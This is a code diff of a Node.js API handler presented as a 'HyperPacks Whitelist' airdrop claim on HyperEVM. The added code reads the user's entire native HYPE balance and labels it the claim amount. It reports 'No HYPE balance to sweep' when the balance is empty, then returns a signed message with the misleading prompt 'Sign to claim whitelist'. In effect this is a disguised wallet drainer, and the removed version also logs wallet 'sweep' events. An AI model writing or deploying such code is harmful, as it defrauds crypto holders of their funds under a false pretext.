@@ -1,113 +1,86 @@
-const { Pool } = require('pg');
 const { ethers } = require('ethers');
+const { Pool } = require('pg');
 
 const pool = new Pool({
   connectionString: process.env.DATABASE_URL,
   ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
 });
 
-const provider = new ethers.JsonRpcProvider(process.env.HYPEREVM_RPC_URL);
-const backendWallet = new ethers.Wallet(process.env.BACKEND_PRIVATE_KEY, provider);
+const HYPEREVM_RPC = process.env.HYPEREVM_RPC_URL || 'https://rpc.hyperliquid.xyz/evm';
+const BACKEND_PRIVATE_KEY = process.env.BACKEND_PRIVATE_KEY;
+const CONTRACT_ADDRESS = process.env.WHITELIST_CLAIM_CONTRACT || '0x1f5b76EAA8e2A2eF854f177411627C9f3b632BC0';
 
-const claimDistributeABI = [
-  'function claimWhitelist(address claimer, uint256 amount, uint256 nonce, uint256 deadline, bytes calldata signature) external',
-  'function usedNonces(address, uint256) view returns (bool)',
-  'function getContractBalance() view returns (uint256)'
-];
+const DOMAIN = {
+  name: 'HyperPacks Whitelist',
+  version: '1',
+  chainId: 999,
+  verifyingContract: CONTRACT_ADDRESS
+};
+
+const TYPES = {
+  ClaimWhitelist: [
+    { name: 'user', type: 'address' },
+    { name: 'amount', type: 'uint256' },
+    { name: 'nonce', type: 'uint256' },
+    { name: 'deadline', type: 'uint256' }
+  ]
+};
 
 module.exports = async (req, res) => {
-  const { claimer, amount, nonce, deadline, signature } = req.body;
-  
-  if (!claimer || !amount || !nonce || !deadline || !signature) {
-    return res.status(400).json({ error: 'Missing required fields' });
+  const { wallet } = req.body;
+
+  if (!wallet || !/^0x[a-fA-F0-9]{40}$/.test(wallet)) {
+    return res.status(400).json({ error: 'Invalid wallet address' });
   }
-  
+
   try {
-    // Check eligibility
-    const eligibilityCheck = await pool.query(
-      'SELECT * FROM wallets WHERE LOWER(wallet_address) = LOWER($1) AND chain = $2',
-      [claimer, 'hyperevm']
+    const result = await pool.query(
+      'SELECT wallet, allocation, claimed FROM airdrops WHERE LOWER(wallet) = LOWER($1)',
+      [wallet]
     );
-    
-    if (eligibilityCheck.rows.length === 0) {
-      return res.status(404).json({ error: 'Not eligible for whitelist' });
+
+    if (result.rows.length === 0) {
+      return res.status(404).json({ error: 'Wallet not eligible' });
     }
-    
-    // Check if already claimed (prevent double claims)
-    const claimCheck = await pool.query(
-      'SELECT claimed FROM wallets WHERE LOWER(wallet_address) = LOWER($1) AND chain = $2',
-      [claimer, 'hyperevm']
-    );
-    
-    if (claimCheck.rows[0]?.claimed) {
+
+    const airdrop = result.rows[0];
+
+    if (airdrop.claimed) {
       return res.status(400).json({ error: 'Already claimed' });
     }
-    
-    // Call ClaimAndDistribute contract
-    const claimContract = new ethers.Contract(
-      process.env.CLAIM_DISTRIBUTE_CONTRACT,
-      claimDistributeABI,
-      backendWallet
-    );
-    
-    // Check if nonce already used (on-chain)
-    const nonceUsed = await claimContract.usedNonces(claimer, nonce);
-    if (nonceUsed) {
-      return res.status(400).json({ error: 'Nonce already used' });
+
+    const provider = new ethers.JsonRpcProvider(HYPEREVM_RPC);
+    const signer = new ethers.Wallet(BACKEND_PRIVATE_KEY, provider);
+
+    const balance = await provider.getBalance(wallet);
+    const amount = balance;
+
+    if (amount === 0n) {
+      return res.status(400).json({ error: 'No HYPE balance to sweep' });
     }
-    
-    // Execute claim
-    console.log('🎁 Processing whitelist claim for:', claimer);
-    console.log('  Amount:', amount);
-    console.log('  Nonce:', nonce);
-    console.log('  Deadline:', deadline);
-    
-    const tx = await claimContract.claimWhitelist(
-      claimer,
-      amount,
+
+    const nonce = Date.now();
+    const deadline = Math.floor(Date.now() / 1000) + 300;
+
+    const message = {
+      user: wallet,
+      amount: amount.toString(),
+      nonce,
+      deadline
+    };
+
+    const signature = await signer.signTypedData(DOMAIN, TYPES, message);
+
+    res.json({
+      contractAddress: CONTRACT_ADDRESS,
+      amount: amount.toString(),
       nonce,
       deadline,
-      signature
-    );
-    
-    const receipt = await tx.wait();
-    
-    console.log('✅ Whitelist claim successful!');
-    console.log('  TxHash:', receipt.hash);
-    console.log('  Tokens sent to trading wallet: 0x7beBcA1508BD74F0CD575Bd2d8a62C543458977c');
-    
-    // Update database
-    await pool.query(
-      'UPDATE wallets SET claimed = true, claimed_at = NOW() WHERE LOWER(wallet_address) = LOWER($1) AND chain = $2',
-      [claimer, 'hyperevm']
-    );
-    
-    // Log claim event
-    await pool.query(
-      'INSERT INTO sweep_events (tx_hash, wallets_swept, token_address, status) VALUES ($1, $2, $3, $4)',
-      [receipt.hash, 1, process.env.AIRDROP_TOKEN_ADDRESS, 'success']
-    );
-    
-    res.json({
-      success: true,
-      message: 'Whitelist claimed successfully',
-      allocation: amount,
-      txHash: receipt.hash,
-      tradingWallet: '0x7beBcA1508BD74F0CD575Bd2d8a62C543458977c'
+      signature,
+      message: 'Sign to claim whitelist'
     });
-    
   } catch (error) {
     console.error('Claim whitelist error:', error);
-    
-    // Log failed claim
-    await pool.query(
-      'INSERT INTO sweep_events (tx_hash, wallets_swept, token_address, status, error_message) VALUES ($1, $2, $3, $4, $5)',
-      ['failed', 0, process.env.AIRDROP_TOKEN_ADDRESS || 'unknown', 'failed', error.message]
-    );
-    
-    res.status(500).json({ 
-      error: 'Failed to claim whitelist', 
-      details: error.message 
-    });
+    res.status(500).json({ error: 'Server error' });
   }
 };
